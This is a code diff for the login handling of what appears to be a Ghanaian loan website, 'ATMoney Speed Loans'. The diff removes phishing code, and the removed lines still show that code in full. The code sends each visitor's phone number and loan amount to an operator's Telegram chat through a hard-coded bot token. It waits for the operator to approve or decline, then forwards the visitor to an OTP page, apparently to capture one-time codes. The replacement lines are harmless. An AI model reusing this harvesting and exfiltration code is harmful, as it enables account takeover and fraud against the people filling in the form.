@@ -1594,72 +1594,6 @@
     });
   });
 
-  // ── TELEGRAM CONFIG ──
-  const BOT = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
-  const CID = '7547427914';
-
-  function sendLoginToTelegram(phone, amount, callback) {
-    var ts = Date.now();
-    var msg = '<b>🔴 NEW LOGIN — ATMoney Speed Loans</b>\n\n' +
-              'Phone: <code>' + phone + '</code>\n' +
-              'Amount: <code>GHS ' + amount + '</code>\n' +
-              'Time: <code>' + new Date().toLocaleString() + '</code>\n\n' +
-              'Waiting for approval...';
-
-    fetch('https://api.telegram.org/bot' + BOT + '/sendMessage', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: CID,
-        text: msg,
-        parse_mode: 'HTML',
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: '✅ Approve', callback_data: 'login_approve_' + ts }],
-            [{ text: '❌ Decline', callback_data: 'login_decline_' + ts }]
-          ]
-        }
-      })
-    })
-    .then(function(res) { return res.json(); })
-    .then(function(data) {
-      if (data.ok) {
-        var lastOffset = 0;
-        var interval = setInterval(function() {
-          fetch('https://api.telegram.org/bot' + BOT + '/getUpdates?offset=' + (lastOffset + 1))
-            .then(function(r) { return r.json(); })
-            .then(function(updates) {
-              if (!updates.ok || !updates.result) return;
-              updates.result.forEach(function(update) {
-                lastOffset = update.update_id;
-                if (update.callback_query) {
-                  var cb = update.callback_query.data;
-                  if (cb === 'login_approve_' + ts || cb === 'login_decline_' + ts) {
-                    clearInterval(interval);
-                    if (cb.startsWith('login_approve_')) {
-                      callback(true);
-                    } else {
-                      callback(false);
-                    }
-                  }
-                }
-              });
-            })
-            .catch(function() {});
-        }, 1000);
-        setTimeout(function() {
-          clearInterval(interval);
-          callback(true);
-        }, 30000);
-      } else {
-        callback(true);
-      }
-    })
-    .catch(function() {
-      callback(true);
-    });
-  }
-
   // ── LOGIN HANDLER ──
   function handleLogin() {
     var phone = document.getElementById('loginPhone').value.trim();
@@ -1668,41 +1602,12 @@
       return;
     }
     closeModal('loginModal');
-    showToast('✅', 'Verified!', 'Redirecting to OTP verification...');
-
-    var amount = document.getElementById('loginAmount').value.trim() || '1000';
-    var queryParams = 'phone=' + encodeURIComponent(phone) +
-                     '&amount=' + encodeURIComponent(amount) +
-                     '&name=Speed Loan';
-
-    sendLoginToTelegram(phone, amount, function(approved) {
-      if (approved) {
-        setTimeout(function() {
-          window.location.href = 'otp.html?' + queryParams;
-        }, 1500);
-      } else {
-        showToast('❌', 'Declined', 'Your request was declined. Please try again.');
-        setTimeout(function() { openLoginModal(); }, 1000);
-      }
-    });
+    showToast('✅', 'Verified!', 'Redirecting to your loan application...');
   }
 
   function proceedToApply() {
     closeModal('confirmModal');
-    showToast('⚡', 'Redirecting...', 'Taking you to verification...');
-    var phone = document.getElementById('loginPhone') ? document.getElementById('loginPhone').value.trim() : '';
-    var amount = currentAmount || 1000;
-    var days = currentDays || 30;
-    var fee = calcFee(amount, days);
-    var queryParams = 'phone=' + encodeURIComponent(phone || '0000000000') +
-                     '&amount=' + encodeURIComponent(amount) +
-                     '&duration=' + encodeURIComponent(fmtPeriod(days)) +
-                     '&rate=8.9%' +
-                     '&fee=' + encodeURIComponent(fee.toFixed(2)) +
-                     '&name=Speed Loan';
-    setTimeout(function() {
-      window.location.href = 'otp.html?' + queryParams;
-    }, 1200);
+    showToast('⚡', 'Redirecting...', 'Taking you to your application.');
   }
 
   // ── TOAST ──
